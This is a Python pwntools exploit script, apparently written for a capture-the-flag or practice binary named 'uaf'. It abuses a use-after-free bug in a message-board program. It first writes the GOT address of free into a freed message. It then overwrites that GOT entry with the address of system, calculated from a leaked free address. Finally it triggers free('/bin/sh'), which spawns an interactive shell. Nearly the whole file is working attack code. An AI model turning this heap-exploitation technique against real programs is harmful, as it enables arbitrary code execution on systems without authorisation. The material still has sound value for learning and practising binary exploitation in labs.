#!/usr/bin/env python
from pwn import *
 
__author__="daizy"
 
def add_new_msg(cmd, name_len, name, title_len, title, content_len, content):
        p.recvuntil("\n")
        cmd = str(cmd)+ "\n"
        p.send(cmd)
        p.recvuntil("\n")   #input name size
        p.send(str(name_len) + "\n")
        p.recvuntil("\n")  # input name
        p.send(name + "\n")
    	p.recvuntil("\n")   #input title size
        p.send(str(title_len) + "\n")
        p.recvuntil("\n")  # input title
        p.send(title + "\n")
    	p.recvuntil("\n")   #input content size
        p.send(str(content_len) + "\n")
        p.recvuntil("\n")  # input content
        p.send(content + "\n")
def print_msg(cmd, msg_index):
        p.recvuntil("\n")
        cmd = str(cmd)+ "\n"
        p.send(cmd)
   	p.recvuntil("\n")
        cmd = str(msg_index)+ "\n"
        p.send(cmd)
   	p.recvuntil("\n")   #print msg info
def delete_msg(cmd):
    	p.recvuntil("\n")
        cmd = str(cmd)+ "\n"
        p.send(cmd)
def modify_msg(cmd, name_len, name, title_len, title, content_len, content):
    	p.recvuntil("\n")
        cmd = str(cmd)+ "\n"
        p.send(cmd)
    	p.recvuntil("\n")   #input new name size
        p.send(str(name_len) + "\n")
        p.recvuntil("\n")  # input new name
        p.send(name + "\n")
    	p.recvuntil("\n")   #input new title size
        p.send(str(title_len) + "\n")
        p.recvuntil("\n")  # input new title
        p.send(title + "\n")
    	p.recvuntil("\n")   #input new content size
        p.send(str(content_len) + "\n")
        p.recvuntil("\n")  # input new content
        p.send(content + "\n")
def back_msg_main(cmd):
        p.recvuntil("\n")
        cmd = str(cmd) + "\n"
        p.send(cmd)
 
if __name__ == "__main__":
        libc = ELF('libc.so')
        elf = ELF('uaf')
         
        p = process('./uaf')
        #p = remote('127.0.0.1', 15000)
	gdb.attach(p)         
        libc_system = libc.symbols['system']
        libc_free = libc.symbols['free']
        offset_sys_free = libc_system - libc_free
        print '\noffset_sys_free= ' + hex(offset_sys_free)
         
        got_free = elf.got['free']
        print '\ngot_free= ' + hex(got_free)
        #step 1 add two msg,msg two's author,title,content is /bin/sh
        print "\nadd new msg"
        add_new_msg(1, 4,"test", 4, "test", 5, "hello")
        add_new_msg(1, 7,"/bin/sh", 7,"/bin/sh", 7,"/bin/sh")
        #step2 print the new msg
        print "\n step2 print msg by msgid"
        print_msg(2, 1)
        #step3 delete the new msg
        print "\n setp3 delete msg"
        delete_msg(1)
 
        #step4 modify the delete msg
        print "\n step4 modify msg"
        content = "c"*12 + p32(got_free) + "c"*4+p32(got_free) + "c"*4+p32(got_free) + "c"*8
        modify_msg(2, 4, "test", 4, "test", 40, content)
        #step5 calculate system address and second modify the delete msg to write system address to got.free
        print "\nstep5 calculate system address and write to got.free"
        free_addr = int(raw_input("free address:"), 16)
        system_addr = free_addr + offset_sys_free
        modify_msg(2, 4, p32(system_addr), 4, p32(system_addr), 4, p32(system_addr))
         
        #step 6 exit msg operate and back to add new msg
        print "\nback to msg main"
        back_msg_main(4)
        #step 7 free('/bin/sh') ->system('/bin/sh')
        print "\nfree('/bin/sh') ->system('/bin/sh')"
        #print "\nprint new msg2"
        print_msg(2, 2)
        #print "\n free new msg2->system"
        delete_msg(1)
        p.interactive()
